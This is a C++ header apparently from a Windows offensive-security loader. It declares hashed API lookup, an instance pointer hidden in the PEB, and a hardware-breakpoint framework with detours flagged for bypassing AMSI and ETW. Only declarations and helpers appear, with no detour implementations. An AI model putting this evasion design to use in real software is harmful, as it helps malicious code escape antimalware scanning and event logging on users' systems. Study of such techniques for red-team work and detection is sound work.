#ifndef GENERAL_HPP
#define GENERAL_HPP

#include <Native.hpp>
#include <ntstatus.h>

#define Dbg1( x, ... ) Instance.Win32.DbgPrint( x, ##__VA_ARGS__ )
#define Dbg2( x, ... ) Instance->Win32.DbgPrint( x, ##__VA_ARGS__ )

#define DECLAPI( x )       decltype( x ) * x
#define G_INSTANCE         INSTANCE* Instance = (INSTANCE*)( NtCurrentPeb()->TelemetryCoverageHeader );
#define DECLFN             __attribute__( ( section( ".text$B" ) ) )

#define min(a, b) ((a) < (b) ? (a) : (b))

#define NtCurrentThreadID HandleToUlong( NtCurrentTeb()->ClientId.UniqueThread )

#define RSL_IMP( w, m ) { \
    for ( int i = 1; i < HashPlural<decltype( Instance->w, m )>(); i++ ) { \
        reinterpret_cast<UPTR*>( &w )[ i ] = LoadApi( m, reinterpret_cast<UPTR*>( &m )[ i ] ); \
    } \
}

EXTERN_C PVOID StartPtr();
EXTERN_C PVOID EndPtr();

auto FindGadget(
    _In_ PVOID  ModuleBase,
    _In_ UINT16 RegValue
) -> PVOID;

auto LoadApi(
    _In_ const UPTR ModBase,
    _In_ const UPTR SymbHash
) -> UPTR;

auto LoadModule(
    _In_ const ULONG LibHash
) -> UPTR;

template <typename T>
constexpr SIZE_T StructCount() {
    SIZE_T Count = 0;
    SIZE_T StructLen   = sizeof( T );

    while ( StructLen > Count * sizeof( UPTR ) ) {
        Count++;
    }

    return Count;
}

template <typename T = char>
inline auto DECLFN HashStr(
    _In_ const T* String
) -> UPTR {
    ULONG CstHash = 0x515528a;
    BYTE  Value   = 0;

    while ( * String ) {
        Value = static_cast<BYTE>( *String++ );

        if ( Value >= 'a' ) {
            Value -= 0x20;
        }

        CstHash ^= Value;
        CstHash *= 0x01000193;
    }

    return CstHash;
}

#define RangeHeadList( HEAD_LIST, TYPE, SCOPE ) \
{                                               \
    PLIST_ENTRY __Head = ( & HEAD_LIST );       \
    PLIST_ENTRY __Next = { 0 };                 \
    TYPE        Entry  = (TYPE)__Head->Flink;   \
    for ( ; __Head != (PLIST_ENTRY)Entry; ) {   \
        __Next = ((PLIST_ENTRY)Entry)->Flink;   \
        SCOPE                                   \
        Entry = (TYPE)(__Next);                 \
    }                                           \
}

struct _INSTANCE {
    PVOID HeapHandle;
    PVOID Start;
    UPTR  Size;

    struct {
        DECLAPI( NtGetContextThread );
        DECLAPI( NtContinue );
        DECLAPI( LoadLibraryA );

        DECLAPI( RtlAddVectoredExceptionHandler );
    } Win32;

    struct {
        PVOID Handler;
        BOOL  Init;

        PVOID NtTraceEvent;
        PVOID AmsiScanBuffer;

        UPTR Addresses[4];
        UPTR Callbacks[4];
    } Hwbp;
};
typedef _INSTANCE INSTANCE;

#define BYPASS_NONE 0x000
#define BYPASS_EXIT 0x200
#define BYPASS_ALL  0x100
#define BYPASS_ETW  0x400
#define BYPASS_AMSI 0x700

enum Dr {
    x0,
    x1,
    x2,
    x3
};

namespace Hwbp {
    auto SetDr7(
        UPTR ActVal,
        UPTR NewVal,
        INT  StartPos,
        INT  BitsCount
    ) -> UPTR;

    auto Install(
        UPTR  Address,
        INT8  Drx,
        PVOID Callback
    ) -> BOOL;

    auto Uninstall(
        UPTR  Address
    ) -> BOOL;

    auto SetBreak(
        UPTR  Address,
        INT8  Drx,
        BOOL  Init
    ) -> BOOL;

    auto Insert(
        UPTR  Address,
        INT8  Drx,
        BOOL  Init
    ) -> BOOL;

    auto Init( VOID ) -> BOOL;

    auto SetArg(
        PCONTEXT Ctx,
        UPTR     Val,
        ULONG    Idx
    ) -> VOID;

    auto GetArg(
        PCONTEXT Ctx,
        ULONG    Idx
    ) -> UPTR;

    auto Act( VOID ) -> BOOL;

    auto HandleException(
        EXCEPTION_POINTERS* e
    ) -> LONG;

    auto EtwDetour( PCONTEXT Ctx ) -> VOID;
    auto AmsiDetour( PCONTEXT Ctx ) -> VOID;
}

#endif // GENERAL_HPP